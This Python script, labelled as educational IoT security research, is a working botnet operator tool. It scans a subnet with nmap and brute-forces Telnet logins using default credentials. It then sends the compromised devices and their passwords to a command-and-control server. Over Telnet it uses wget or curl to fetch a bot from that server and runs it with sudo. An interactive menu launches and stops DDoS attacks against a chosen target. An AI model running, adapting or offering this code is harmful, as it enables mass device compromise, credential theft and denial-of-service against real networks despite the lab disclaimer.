#!/usr/bin/env python3
"""
IoT Security Research - Exploit Script
Educational Purpose Only - For Controlled Lab Environment
"""

import socket
import telnetlib
import subprocess
import threading
import time
import requests
import json
import logging
import os
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
import sys
import argparse

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('exploit.log'),
        logging.StreamHandler()
    ]
)

class IoTExploiter:
    def __init__(self, cnc_server_ip, subnet=None):
        self.cnc_server_ip = cnc_server_ip
        self.cnc_url = f"http://{cnc_server_ip}:5000"
        self.subnet = subnet or "11.10.10.0/24"  # Default IoT lab subnet
        self.credentials = [
            # Default credentials
            ("admin", "admin"),
            ("root", "root"),
            ("admin", "password"),
            ("root", "password"),
            # IoT-specific credentials
            ("admin", ""),
            ("root", ""),
            ("admin", "1234"),
            ("root", "1234"),
            ("admin", "admin123"),
            ("root", "root123"),
            ("ipcamadmin", "admin"),
            ("temphumidadmin", "admin"),
            # Common IoT device credentials
            ("admin", "admin1234"),
            ("root", "root1234"),
            ("admin", "adminadmin"),
            ("root", "rootroot"),
            ("admin", "12345678"),
            ("root", "12345678"),
            # Empty credentials
            ("", ""),
            ("admin", None),
            ("root", None)
        ]
        self.compromised_devices = []
        self.scan_results = []
        self.infected_devices = []  # Track infected devices
        
    def log(self, message):
        """Log message with timestamp"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        logging.info(f"[Exploiter] {message}")
        print(f"[{timestamp}] {message}")
    
    def scan_network(self):
        """Scan network for vulnerable IoT devices using direct nmap command"""
        try:
            self.log(f"Starting network scan on {self.subnet}")

            # Phase 1: Quick scan for active hosts
            self.log("Phase 1: Quick scan for active hosts...")
            result = subprocess.run([
                "nmap", "-sn", self.subnet
            ], capture_output=True, text=True)
            output = result.stdout
            active_hosts = []
            for line in output.splitlines():
                if line.startswith("Nmap scan report for"):
                    ip = line.split()[-1]
                    active_hosts.append(ip)
            if not active_hosts:
                self.log("No active hosts found")
                return []
            self.log(f"Found {len(active_hosts)} active hosts")

            # Phase 2: Detailed scan of active hosts
            self.log("Phase 2: Detailed scan of active hosts...")
            target_ports = "23,80,443,1883,8883,8080"  # Common IoT ports
            vulnerable_hosts = []
            for host in active_hosts:
                result = subprocess.run([
                    "nmap", "-p", target_ports, "-sV", host
                ], capture_output=True, text=True)
                output = result.stdout
                current_ip = host
                for line in output.splitlines():
                    # Example: 23/tcp   open  telnet
                    if "/tcp" in line and "open" in line:
                        parts = line.split()
                        port = int(parts[0].split("/")[0])
                        service = parts[2] if len(parts) > 2 else "unknown"
                        self.log(f"Found open port {port} ({service}) on {current_ip}")
                        vulnerable_hosts.append({
                            'ip': current_ip,
                            'port': port,
                            'service': service
                        })
            # After scan, keep only the latest result per IP
            latest_results = {}
            for device in vulnerable_hosts:
                ip = device['ip']
                latest_results[ip] = device  # Overwrite, so last is latest
            self.scan_results = list(latest_results.values())
            self.log(f"Scan complete. Found {len(self.scan_results)} unique potentially vulnerable devices")
            
            # Send scan results to C&C server's /add-scan-result endpoint
            for device in self.scan_results:
                try:
                    response = requests.post(
                        f"{self.cnc_url}/add-scan-result",
                        json={
                            'ip': device['ip'],
                            'port': device['port'],
                            'service': device['service']
                            # Credentials are not available yet at scan stage
                        },
                        timeout=5
                    )
                    if response.status_code != 200:
                        self.log(f"Failed to send scan result for {device['ip']} to C&C server. Status code: {response.status_code}")
                except Exception as e:
                    self.log(f"Error sending scan result for {device['ip']} to C&C server: {e}")

            return self.scan_results
        except Exception as e:
            self.log(f"Error during network scan: {e}")
            return []
    
    def attempt_telnet_login(self, host, port, username, password):
        """Attempt to login via telnet"""
        try:
            tn = telnetlib.Telnet(host, port, timeout=5)
            
            # Wait for login prompt
            response = tn.read_until(b"login: ", timeout=5)
            if b"login:" not in response:
                response = tn.read_until(b"Username: ", timeout=5)
            
            # Send username
            tn.write(username.encode() + b"\n")
            
            # Wait for password prompt
            response = tn.read_until(b"Password: ", timeout=5)
            if b"Password:" not in response:
                response = tn.read_until(b"password: ", timeout=5)
            
            # Send password
            if password:
                tn.write(password.encode() + b"\n")
            else:
                tn.write(b"\n")
            
            # Check response
            response = tn.read_until(b"$", timeout=5)
            if b"$" in response or b"#" in response or b">" in response:
                return True
            
            return False
            
        except Exception as e:
            return False
        finally:
            try:
                tn.close()
            except:
                pass
    
    def register_compromised_device(self, ip, username, password):
        """Register compromised device with C&C server in the devices table."""
        try:
            # Add to local list
            self.compromised_devices.append({
                'ip': ip,
                'username': username,
                'password': password,
                'timestamp': datetime.now().isoformat()
            })
            
            # Register with C&C server using the bot-checkin endpoint structure
            # This will insert/update the device in the 'devices' table with status 'active' or 'online'
            # We'll use 'online' as the status after successful compromise.
            payload = {
                'ip': ip,
                'username': username, # Include username and password for storage
                'password': password,
                'status': 'online'  # Set status to 'online' after compromise
            }
            self.log(f"Registering device {ip} with C&C server. Payload: {payload}") # Log the payload
            response = requests.post(
                f"{self.cnc_url}/bot-checkin", # Using bot-checkin endpoint for registration
                json=payload,
                timeout=5
            )
            
            if response.status_code == 200:
                self.log(f"Successfully registered compromised device {ip} with C&C server.")
                return True
            else:
                self.log(f"Failed to register compromised device {ip} with C&C server. Status code: {response.status_code}")
                self.log(f"Response: {response.text}")
                return False
                
        except Exception as e:
            self.log(f"Error registering compromised device {ip}: {e}")
            return False
    
    def deploy_bot(self, ip, username, password):
        """Deploy bot to compromised device"""
        try:
            self.log(f"Deploying bot to {ip}")
            
            # Download bot from C&C server
            response = requests.get(f"{self.cnc_url}/download-bot", timeout=10)
            if response.status_code != 200:
                self.log("Failed to download bot from C&C server")
                return False
            
            # Save bot temporarily
            with open('temp_bot.py', 'w') as f:
                f.write(response.text)
            
            # Upload bot to device (simplified for lab environment)
            self.log(f"Bot downloaded successfully. Please manually deploy to {ip}")
            self.log(f"Use credentials: {username}:{password}")
            
            # Clean up
            os.remove('temp_bot.py')
            return True
            
        except Exception as e:
            self.log(f"Error deploying bot to {ip}: {e}")
            return False
    
    def save_results(self):
        """Save scan and exploitation results"""
        try:
            # Create results directory if it doesn't exist
            os.makedirs('results', exist_ok=True)
            
            # Save scan results
            with open('results/scan_results.json', 'w') as f:
                json.dump(self.scan_results, f, indent=4)
            
            # Save compromised devices
            with open('results/compromised_devices.json', 'w') as f:
                json.dump(self.compromised_devices, f, indent=4)
            
            self.log("Results saved to results/ directory")
            
        except Exception as e:
            self.log(f"Error saving results: {e}")
    
    def infect_devices(self):
        """Infect all compromised devices by downloading and running the bot client via Telnet."""
        if not self.compromised_devices:
            print("No compromised devices available.")
            return
        print("\nInfecting compromised devices...")
        for device in self.compromised_devices:
            ip = device['ip']
            username = device['username']
            password = device['password']
            try:
                tn = telnetlib.Telnet(ip, 23, timeout=10)
                tn.read_until(b"login: ", timeout=5)
                tn.write(username.encode() + b"\n")
                tn.read_until(b"Password: ", timeout=5)
                if password:
                    tn.write(password.encode() + b"\n")
                else:
                    tn.write(b"\n")
                # Wait for shell prompt
                tn.read_until(b"$", timeout=5)
                # Try wget, then curl
                cnc_url = f"http://{self.cnc_server_ip}:5000/download-bot"
                download_cmd = f"wget -O bot_client.py {cnc_url} || curl -o bot_client.py {cnc_url}\n"
                tn.write(download_cmd.encode())
                time.sleep(2)
                # Start the bot in background with sudo
                start_cmd = f"sudo nohup python3 bot_client.py {self.cnc_server_ip} &\n"
                tn.write(start_cmd.encode())
                # Wait for possible sudo password prompt
                response = tn.read_until(b"password", timeout=3)
                if b"password" in response.lower():
                    tn.write((password + "\n").encode())
                # else: no prompt, just continue
                time.sleep(2)
                self.infected_devices.append({
                    'ip': ip,
                    'username': username,
                    'password': password,
                    'timestamp': datetime.now().isoformat()
                })
                print(f"Infected {ip} successfully.")
                tn.close()
            except Exception as e:
                print(f"Failed to infect {ip}: {e}")
    
    def view_infected_devices(self):
        """View infected devices."""
        if not self.infected_devices:
            print("No infected devices available.")
        else:
            print("\nInfected Devices:")
            for device in self.infected_devices:
                print(f"IP: {device['ip']}")
                print(f"Credentials: {device['username']}:{device['password']}")
                print(f"Infected at: {device['timestamp']}")
                print("-"*30)
    
    def run_hping3_via_telnet(self, ip, username, password, hping3_cmd):
        """Run hping3 via Telnet, handle sudo password prompt."""
        import telnetlib
        import time
        try:
            tn = telnetlib.Telnet(ip, 23, timeout=10)
            tn.read_until(b"login: ", timeout=5)
            tn.write(username.encode() + b"\n")
            tn.read_until(b"Password: ", timeout=5)
            tn.write((password + "\n").encode())
            tn.read_until(b"$", timeout=5)
            # Send the hping3 command with sudo
            tn.write((hping3_cmd + "\n").encode())
            # Wait for possible sudo password prompt
            response = tn.read_until(b"password", timeout=3)
            if b"password" in response.lower():
                tn.write((password + "\n").encode())
            print(f"Started hping3 on {ip} with command: {hping3_cmd}")
            # Optionally, keep the session open for a while
            time.sleep(5)
            tn.close()
        except Exception as e:
            print(f"Failed to run hping3 on {ip}: {e}")

    def start_ddos_via_c2(self):
        """Start Telnet-based DDoS attack via C2 server API for all compromised devices."""
        if not self.compromised_devices:
            print("No compromised devices available.")
            return
        target_ip = input("Enter target IP to attack: ")
        attack_type = input("Enter attack type (syn/rtsp/mqtt): ")
        try:
            response = requests.post(
                f"{self.cnc_url}/start-telnet-ddos",
                json={
                    "target": target_ip,
                    "attack_type": attack_type
                },
                timeout=10
            )
            print(f"C2 server response: {response.json()}")
        except Exception as e:
            print(f"Failed to initiate Telnet DDoS via C2: {e}")

    def stop_ddos_via_c2(self):
        """Stop Telnet-based DDoS attack via C2 server API on all compromised devices."""
        if not self.compromised_devices:
            print("No compromised devices available.")
            return
        try:
            response = requests.post(
                f"{self.cnc_url}/stop-telnet-ddos",
                timeout=10
            )
            print(f"C2 server response: {response.json()}")
        except Exception as e:
            print(f"Failed to stop Telnet DDoS via C2: {e}")

    def brute_force_telnet(self):
        """Automatically brute-force all found scan results for Telnet credentials."""
        if not self.scan_results:
            print("No scan results available. Please run a scan first.")
            return
        print("\nBrute-forcing Telnet credentials for all scan results...")
        for target in self.scan_results:
            target_ip = target['ip']
            port = target['port']
            for username, password in self.credentials:
                if self.attempt_telnet_login(target_ip, port, username, password):
                    print(f"Success! {target_ip} Credentials: {username}:{password}")
                    self.register_compromised_device(target_ip, username, password)
                    break
    
    def fetch_scan_results_from_c2(self):
        """Fetch scan results from the C2 server and load into self.scan_results."""
        try:
            response = requests.get(f"{self.cnc_url}/get-scan-results", timeout=5)
            if response.status_code == 200:
                self.scan_results = response.json()
                print(f"Loaded {len(self.scan_results)} scan results from C2 server.")
            else:
                print("Failed to fetch scan results from C2 server.")
        except Exception as e:
            print(f"Error fetching scan results: {e}")

    def print_status(self):
        """Print current status of scan results, compromised devices, and infected devices"""
        print("\n" + "="*50)
        print("Current Status:")
        print("="*50)
        
        # Print scan results
        print("\n[Scan Results]")
        if not self.scan_results:
            print("No scan results available")
        else:
            for device in self.scan_results:
                print(f"IP: {device['ip']}, Port: {device['port']}, Service: {device['service']}")
        
        # Print compromised devices
        print("\n[Compromised Devices]")
        if not self.compromised_devices:
            print("No compromised devices available")
        else:
            for device in self.compromised_devices:
                print(f"IP: {device['ip']}")
                print(f"Credentials: {device['username']}:{device['password']}")
                print(f"Compromised at: {device['timestamp']}")
                print("-"*30)
        
        # Print infected devices
        print("\n[Infected Devices]")
        if not self.infected_devices:
            print("No infected devices available")
        else:
            for device in self.infected_devices:
                print(f"IP: {device['ip']}")
                print(f"Credentials: {device['username']}:{device['password']}")
                print(f"Infected at: {device['timestamp']}")
                print("-"*30)
        print("="*50)

    def interactive_menu(self):
        """Interactive menu for user control"""
        while True:
            # Always fetch scan results at the start of the menu loop if empty
            if not self.scan_results:
                self.fetch_scan_results_from_c2()
            
            # Print current status
            self.print_status()
            
            print("\nAvailable Actions:")
            print("1. Scan network for vulnerable devices")
            print("2. Brute-force Telnet credentials")
            print("3. Infect compromised devices with bot client")
            print("4. Start DDoS attack")
            print("5. Stop DDoS attack")
            print("6. Save results to disk")
            print("7. Exit")
            
            choice = input("\nEnter your choice (1-7): ")
            
            if choice == "1":
                print("\nScanning network...")
                self.scan_network()
                print("\nScan completed!")
                self.print_status()
                
            elif choice == "2":
                if not self.scan_results:
                    print("No scan results available. Please run a scan first.")
                else:
                    print("\nBrute-forcing Telnet credentials...")
                    self.brute_force_telnet()
                    print("\nBrute-force completed!")
                    self.print_status()
                
            elif choice == "3":
                if not self.compromised_devices:
                    print("No compromised devices available. Please run brute-force first.")
                else:
                    print("\nInfecting devices...")
                    self.infect_devices()
                    print("\nInfection completed!")
                    self.print_status()
                
            elif choice == "4":
                if not self.compromised_devices:
                    print("No compromised devices available. Please run brute-force first.")
                else:
                    self.start_ddos_via_c2()
                
            elif choice == "5":
                if not self.compromised_devices:
                    print("No compromised devices available. Please run brute-force first.")
                else:
                    self.stop_ddos_via_c2()
                
            elif choice == "6":
                self.save_results()
                print("Results saved successfully!")
                
            elif choice == "7":
                print("Exiting...")
                break
                
            else:
                print("Invalid choice. Please try again.")
            
            input("\nPress Enter to continue...")

def main():
    """Main entry point"""
    parser = argparse.ArgumentParser(description='IoT Security Research - Exploit Script')
    parser.add_argument('--cnc', required=True, help='C&C server IP address')
    parser.add_argument('--subnet', help='Target subnet (default: 11.10.10.0/24)')
    args = parser.parse_args()

    # Ping the C&C server before proceeding (robust for Ubuntu/Linux)
    import platform
    import subprocess
    cnc_ip = args.cnc
    print(f"Checking connectivity to C&C server at {cnc_ip}...")
    param = '-n' if platform.system().lower() == 'windows' else '-c'
    try:
        result = subprocess.run(['ping', param, '1', cnc_ip], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        output = result.stdout.lower()
        if 'ttl=' in output or 'bytes from' in output:
            print(f"C&C server {cnc_ip} is reachable. Starting exploit menu...")
        else:
            print(f"Cannot reach C&C server at {cnc_ip}. Exiting.")
            exit(1)
    except Exception as e:
        print(f"Error pinging C&C server: {e}")
        exit(1)

    exploiter = IoTExploiter(args.cnc, args.subnet)
    exploiter.interactive_menu()

if __name__ == "__main__":
    main()